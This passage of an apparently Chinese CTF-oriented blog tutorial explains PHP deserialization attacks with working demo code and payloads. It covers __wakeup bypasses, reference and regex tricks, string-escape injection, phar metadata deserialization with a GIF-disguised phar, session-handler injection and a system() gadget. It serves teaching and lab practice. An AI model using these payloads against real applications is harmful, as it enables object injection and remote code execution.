print (serialize($a)."\r\n");
```

运行一下

[![image-20221209170709748](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209170709748.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209170709748.png)

 这是我们序列化的过程

由于我们new了一个sakura类，所以会调用`__construct`方法,然后就会执行我们的print语句输出了序列化的值，最后new完以后这个类会被销毁所以会调用`__destruct方法`

**同理，我们来看一下反序列化过程,demo如下**

```
<?php
class sakura{
    public $a='HY';
    public $b='666';

    public function __construct(){
        print "这是__construct方法\r\n";
    }

    public function __wakeup(){
        print "这是__wakeup方法\r\n";
    }

    public function __destruct(){
        print "这是__destruct方法\r\n";
    }
}
#$a = new sakura();
#print (serialize($a)."\r\n");
$b = 'O:6:"sakura":2:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";}';
unserialize($b);
```

[![image-20221209171216201](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209171216201.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209171216201.png)

这里由于我们没有new一个对象的操作，所以就没有执行`__construct`方法

首先进行反序列化，`__wakeup`是当执行unserialize()方法时会被自动调用,所以是最先开始调用的

最后会对类进行销毁，所以会调用`__destruct方法`

其他魔术方法的调用都必须在它们两个之间!

到这里基础知识就已经够了，接下来我们就来看一些反序列化在ctf中的常见考法

# 对象注入

当用户的请求在传给反序列化函数`unserialize()`之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的`unserialize`函数，最终导致一个在该应用范围内的任意PHP对象注入。

**对象漏洞**出现得满足两个前提

> 1、`unserialize`的参数可控。
> 2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。

```
<?php
class A{
    var $test = "ssss";
    function __destruct(){
        echo $this->test;
    }
}
$a = 'O:1:"A":1:{s:4:"test";s:2:"HY";}';
unserialize($a);
```

[![image-20221210172357978](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210172357978.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210172357978.png)

# 指针引用

在php反序列化中,r、R 分别表示对象引用和指针引用，在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 & 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。

在解释对象引用和指针引用之前，先让我们看几个例子

```
<?php
class SampleClass {
    var $value;
}

$a = new SampleClass();
$a->value = $a;

$b = new SampleClass();
$b->value = &$b;

echo serialize($a);
echo "\n";
echo serialize($b);
```

[![image-20221209203846002](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209203846002.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209203846002.png)

我们发现,这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1

但是对象引用和指针引用到底有什么区别呢？让我们看下面这个例子

```
<?php
class SampleClass {
    var $value;
}

$a = new SampleClass();
$a->value = $a;
$b = new SampleClass();
$b->value = &$b;

$a->value = 1;
$b->value = 1;

var_dump($a);
var_dump($b);
```

[![image-20221209204547992](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209204547992.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209204547992.png)

这表示，当我们改变`$a->value`的值时，仅仅改变了`$a->value`的值,但是当我们改变`$b->value`的值时，却改变了$b的本身

有时候这个考点会出现在ctf中，现在我们来讲解一个ctf题目

**ctf题目讲解**

```
<?php
highlight_file(__FILE__);
class File {
    public $filename;
    public $secret;
    public function __construct($filename, $secret){
            echo "construct被调用";
            echo $filename;
            echo $secret;
            $this -> filename= $filename ;
            $this->secret=$secret;
}
public function __wakeup(){
            $this->filename="nonoflag" ;
            if(isset($_GET['secret'])){
            $this->secret= $_GET['secret']; 
}
}
public function __destruct(){
            echo "destruct被调用";
            printf($this->filename);
            echo "\n";
}
}

$flag = $_GET['x'];
unserialize($flag);
```

这题稍微改编了下，我们的目的就是让`$this->filename`最终等于`flag.php`,而这题的前提条件又是php的版本较高，无法使用fast destruct的情况

我们先假装不知道不能用fast destruct

首先正常构造一个反序列化

```
<?php
class File {
    public $filename;
    public $secret;
}
$a = new File();
$a->filename='flag.php';
print serialize($a);
//O:4:"File":2:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;}
```

[![image-20221209233516920](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233516920.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233516920.png)

如图，由于`__wakeup`魔术方法的存在`$filename`从我们传入的`flag.php`变为了`nonoflag`,然后尝试使用fast destruct

```
O:4:"File":3:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;}
O:4:"File":2:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;
```

[![image-20221209233659929](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233659929.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233659929.png)

[![image-20221209233712131](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233712131.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233712131.png)

如上图，最终都失败了，所以我们要尝试看有没有其它办法,由于这里并不止`filename`一个变量,而且`__wakeup`里有这样一行代码

[![image-20221209234010104](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209234010104.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209234010104.png)

是不是觉得很眼熟,由此我们可以尝试引入我们上文讲的指针引用

构造payload如下:

```
<?php
class File {
    public $filename;
    public $secret;
}
$a = new File();
$a->filename='HY';
$a->filename=&$a->secret;
print serialize($a);
// O:4:"File":2:{s:8:"filename";N;s:6:"secret";R:2;}
```

然后反序列化的同时给`secret`传入`flag.php`

[![image-20221210000052881](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210000052881.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210000052881.png)

神奇的事情发生了，`filename`的值成功变为`flag.php`了

整个流程是这样的:

我们给`filename`随意赋值为`HY`,然后使用一个指针引用。当反序列化的时候，调用`__wakeup`魔术方法,`filename`被赋值为了`nonoflag`,但是它下一步的时候,`secret`参数就接收了我们传入的`flag.php`,由于指针引用的关系,`filename`也跟着`secret`变为了`flag.php`

# 绕过部分正则

`preg_match('/^O:\d+/')`匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点

1. 利用加号绕过（注意在url里传参时+要编码为%2B）
2. serialize(array( a ) ) ; / / a));// a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)

```
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

[![image-20221210010008949](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010008949.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010008949.png)

# fast destruct(绕过__wakeup)

今天介绍的这个技巧被称为`fast destruct`，可以在`unserialize`函数执行完后，立即触发我们的poc,这样就可以绕过一些限制，如`__wakeup`魔术方法

[![image-20221209200143603](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209200143603.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209200143603.png)

- 存在漏洞的PHP版本: PHP5.6.25之前版本和7.0.10之前的7.x版本
- 漏洞概述: `__wakeup()`魔法函数被绕过,导致执行了一些非预期效果的漏洞
- 漏洞原理: `当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过`

我这里用 phpstudy+php7.0.9来复现这个漏洞

我们来写一个demo

```
<?php
class sakura{
    public $a='HY';
    public $b='666';

    public function __construct(){
        print "这是__construct方法\r\n";
    }

    public function __wakeup(){
        print "这是__wakeup方法\r\n";
    }

    public function __destruct(){
        print "这是__destruct方法\r\n";
    }
}
#$a = new sakura();
#print (serialize($a)."\r\n");
$b = 'O:6:"sakura":2:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";}';
unserialize($b);
```

正常反序列化过程:

[![image-20221209201038411](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201038411.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201038411.png)

**1.修改序列化数字元素个数**

```
O:6:"sakura":3:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";}  //我这里讲2改为了3
```

[![image-20221209201155305](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201155305.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201155305.png)

我们发现只执行了`__destruct`方法，而没有执行`__wakeup`方法，成功绕过了`__wakeup`魔术方法的执行

**2.去掉序列化尾部 }**

```
O:6:"sakura":2:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";
```

我在windows上复现失败了，不过这种方法是可行的，就不再复现了

# php7.1+反序列化对类属性不敏感

在序列化的时候:如果变量前是protected，则是\x00*\x00变量名的形式,如果变量前是private,则是\x00类名\x00的形式

```
<?php
class test{
    protected $a;
    private $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b=  'def';
    }
    public function  __destruct(){
        echo "\n";
        echo $this->a;
        echo $this->b;
    }
}
$a = new test();
echo serialize($a);
```

[![image-20221210004733397](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210004733397.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210004733397.png)

但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有`\x00*\x00`也依然会输出`abc`

```
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
```

# 16进制绕过字符的过滤

```
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

这里写了一个例子:

```
<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 做处理后 \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

[![image-20221210010741617](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010741617.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010741617.png)

如图，处理后成功的绕过了!

# PHP反序列化字符逃逸

一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变。其主要原理就是运用闭合的思想。

示例代码:

```
<?php
highlight_file(__FILE__);
header("Content-Type: text/html; charset=utf-8");
class sakura{
    public $name='HY';
    public $age='25';
}
$a = new sakura();
$a = serialize($a);
print ($a);
var_dump(unserialize($a));
```

运行这段代码,我们可以得到这个类正常序列化的值，和它反序列化的内容

```
O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}
class sakura#1 (2) {
  public $name =>
  string(2) "HY"
  public $age =>
  string(2) "25"
}
```

但是我们可以在反序列化时，对其值做一些手脚,如果我们对这样一个序列化值进行反序列化会发生什么呢?

```
O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}123
```

[![image-20221210013324096](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013324096.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013324096.png)

[![image-20221210012901305](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210012901305.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210012901305.png)

我们发现并没有什么改变，说明{}是字符串反序列化时的分界符，在进行反序列化时，是从左到右读取。读取多少取决于s后面的字符长度

比如当我们将数字改成5

```
O:6:"sakura":2:{s:5:"name";s:2:"HY";s:3:"age";s:2:"25";}
```

[![image-20221210013348276](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013348276.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013348276.png)

此时在读取name时，它会将闭合的双引号也读取在内，而需要闭合字符串的双引号被当作字符串处理，这时就会导致语法错误而报错。

一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变，其主要原理就是运用闭合的思想。

字符逃逸主要有两种，一种是字符增多，一种是字符减少。

**1.过滤后字符变多**

```
<?php
highlight_file(__FILE__);
header("Content-Type: text/html; charset=utf-8");

class sakura{
    public $name;
    public $age='25';
    function __destruct(){
        print $this->age;
    }
}
function change($str){
    return str_replace("H","HH",$str);
}
$a = new sakura();
$a->name=$_GET['x'];
$str=serialize($a);
print "过滤前: "."\n";
print $str;
print "  逃逸前sakura的年龄为:  ";
unset($a);
$str=change($str);
print "  过滤后:"."\n";
print $str."\n";
print "过滤后sakura的年龄为:";
unserialize($str);
```

我们先随意传入一个名字

[![image-20221210014745476](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014745476.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014745476.png)

如果我们传入带有H的名字会怎么样呢?

[![image-20221210014915564](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014915564.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014915564.png)

我们可以发现名字由 HY变为了 HHY

我们输入很多H呢?

[![image-20221210015149828](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015149828.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015149828.png)

神奇的事情发生了,过滤后的序列化字符串名字长度仍然是9,但是实际上它的长度早已经超过9了,所以我们就可以利用这点来构造字符串逃逸

我们首先要想，我们需要把他构造成什么样的形式,我们的目的是要修改age的值，而我们的输入点在name处

```
";s:3:"age";s:2:"99";}
```

这些是我们需要传入的,但是我们还要计算下它有多长，然后选择合适的H的个数去逃逸它

[![image-20221210015919846](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015919846.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015919846.png)

我们需要逃逸22个字符，每多一个H我们可以逃逸一个字符，所以我们需要22个H，由此我们可以传入

```
HHHHHHHHHHHHHHHHHHHHHH";s:3:"age";s:2:"99";}
```

我们来看看效果

[![image-20221210020543648](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020543648.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020543648.png)

我们成功完成了字符串逃逸，改变了age的值！

**2.过滤后字符变少**

这个原理其实也差不多，我们直接上代码

```
<?php
highlight_file(__FILE__);
header("Content-Type: text/html; charset=utf-8");

class sakura{
    public $name;
    public $age='25';
    function __destruct(){
        print $this->age;
    }
}
function change($str){
    return str_replace("HH","H",$str);
}
$a = new sakura();
$a->name=$_GET['x'];
$str=serialize($a);
print "过滤前: "."\n";
print $str;
print "  逃逸前sakura的年龄为:  ";
unset($a);
$str=change($str);
print "  过滤后:"."\n";
print $str."\n";
print "过滤后sakura的年龄为:";
unserialize($str);
```

也就是每输入两个HH就会变为一个H

[![image-20221210020923726](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020923726.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020923726.png)

但是原理是有所不同的，字符增加主要是使s包含的范围被我们的垃圾字符填充，然后会继续反序列化我们恶意的字符串,由于它本来带的那部分序列化内容被我们用}截断，所以并没有起效果

而这个字符串减少的字符串逃逸，我们可以发现，s的范围是大于我们的名字的，所以我们需要让s的范围包含完本来的字符串，这样我们的恶意字符串就得以执行

为了更好的理解题目，我们稍微修改一下代码:

```
<?php
highlight_file(__FILE__);
header("Content-Type: text/html; charset=utf-8");

class sakura{
    public $name='HY';
    public $age='25';
    function __destruct(){
        print $this->age;
    }
}
function change($str){
    return str_replace("HH","H",$str);
}
$a = new sakura();
$str = serialize($a);
echo $str;
echo "\n";
print "改变前sakura的年龄为:";
unset($a);
echo "\n";
$str = change($str);
print $str;
echo "\n";
print "改变后sakura的年龄为:";
unserialize($str);
```

[![image-20221210165137214](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165137214.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165137214.png)

```
O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}
```

我们尝试多给name一些H看会发生什么

[![image-20221210165216207](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165216207.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165216207.png)

我们发现name的值的范围已经大于了HH，所以把`";`也包含进去了,所以我们是不是可以让它把原来的age部分全部包含，让php反序列化我们传入的恶意序列化值呢?

我们构造的恶意payload为:

```
25";s:3:"age";s:2:"99
```

我们需要让s包含的字符有:

```
";s:3:"age";s:21:"25  //20个字符
```

[![image-20221210170054095](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210170054095.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210170054095.png)

# phar反序列化

**概要**

来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。
这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。

**关于流包装**

大多数PHP文件操作允许使用各种URL协议去访问文件路径：如`data://`，`zlib://`或`php://`。
例如常见的

```
include('php://filter/read=convert.base64-encode/resource=index.php');
include('data://text/plain;base64,xxxxxxxxxxxx');
```

`phar://`也是流包装的一种

**漏洞成因**

phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作

**原理分析**

phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)

stub:标识作用，格式为xxx，前面任意，但是一定要以__HALT_COMPILER();?>结尾，否则php无法识别这是一个phar文件；

manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；

[![image-20221211172536017](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172536017.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172536017.png)

the file contents:这里指的是被压缩文件的内容；

[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；

根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作

**注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。**

```
<?php

class TestObject {

}

@unlink("phar.phar");

$phar = new Phar("sakura.phar"); //后缀名必须为phar

$phar->startBuffering(); //开始缓冲 Phar 写操作

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new TestObject();

$o -> data='sakura';

$phar->setMetadata($o); //将自定义的meta-data存入manifest

$phar->addFromString("test.txt", "test"); //添加要压缩的文件

//签名自动计算

$phar->stopBuffering();

?>
```

访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)

[![image-20211027213811961](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027213811961.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027213811961.png)

打开：

[![image-20211027215216183](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215216183.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215216183.png)

发现写入的内容已经被序列化。

有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：

[![image-20221211172631232](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172631232.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172631232.png)

当然不止上面这些

```
可参考链接:https://blog.zsxsoft.com/post/38

//exif
exif_thumbnail
exif_imagetype
    
//gd
imageloadfont
imagecreatefrom***系列函数
    
//hash
    
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
    
// file/url
get_meta_tags
get_headers
    
//standard 
getimagesize
getimagesizefromstring
    
// zip   
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//配合其他协议：(SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
<?php
    $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
    @$pdo->pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?>
    
// Mysql
//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
//配置一下mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""
    
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
?>
```

**漏洞利用**

phar_fan.php

```
<?php
class TestObject{
    function __destruct()
    {
        echo $this -> data;   // TODO: Implement __destruct() method.
    }
}
include('phar://phar.phar');
?>
```

[![image-20211027215532641](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215532641.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215532641.png)

我们来简要说明下整个调用流程：

访问 phar_fun.php这个文件

执行incleude代码

解析phar文件

将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。

对象销毁，调用魔术方法__destruct()

执行echo语句完成攻击。

**将phar伪造成其他格式的文件**

php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。

```
<?php
    class TestObject {
    }

    @unlink("sakura.phar");
    $phar = new Phar("sakura.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

然后调用phar://sakura.php

是一样的效果。

**漏洞的利用条件**

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。

# php session反序列化

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容

在php.ini中存在三项配置项：

```
session.save_path=""   --设置session的存储路径
session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)
```

session.serialize_handler存在以下几种

```
php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
php 键名+竖线（|）+经过serialize()函数处理过的值
php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
```

在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。
php_binary引擎格式

```
<0x04>names:5:"Smi1e";
```

php引擎格式

```
name|s:5:"Smi1e";
```

php_searialize引擎格式

```
a:1:{s:4:"name";s:5:"Smi1e";}
```

当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。
例如传入

```
$_SESSION['name']='|O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}';
```

序列化引擎使用的是php_serialize，那么储存的session文件为

```
a:1:{s:4:"name";s:5:"|O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}";}
```

而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。

# PHP原生类SoapClient反序列化利用

soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。
类介绍：

```
SoapClient {
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = "" ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed}
```

